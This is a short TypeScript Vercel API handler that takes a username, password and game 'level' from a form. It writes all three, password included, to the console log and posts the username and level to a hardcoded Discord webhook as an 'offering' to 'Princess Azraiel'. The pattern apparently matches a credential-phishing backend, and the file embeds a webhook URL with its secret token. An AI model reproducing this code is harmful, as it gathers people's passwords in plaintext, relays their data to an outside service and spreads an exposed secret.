import { VercelRequest, VercelResponse } from '@vercel/node';

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1366483221516128336/JvNIFLC6lP75Uup4IkNI47tgBXGNWwcPtcqKCQVUK1hcj3NoIN0Ji-ME8QULcVIZS_fk';

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method === 'POST') {
    const { username, password, level } = req.body;

    // Log the received data (for debugging purposes)
    console.log('Received offering:', { username, password, level });

    // Data to send to the webhook
    const data = {
      content: `💌 New Offering 💌\n\n**Username:** ${username}\n**Level:** ${level}\n\nThe heart is now offered to Princess Azraiel! 💖`,
    };

    // Send the data to the webhook
    try {
      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });

      // Check if the webhook request was successful
      if (response.ok) {
        console.log('Data sent to webhook successfully');
        res.status(200).json({ message: 'Offering received and forwarded to webhook' });
      } else {
        console.error('Failed to send data to webhook');
        res.status(500).json({ message: 'Failed to forward data to webhook' });
      }
    } catch (err) {
      console.error('Error sending data to webhook:', err);
      res.status(500).json({ message: 'Error processing request' });
    }
  } else {
    res.status(405).json({ message: 'Method Not Allowed' });
  }
}
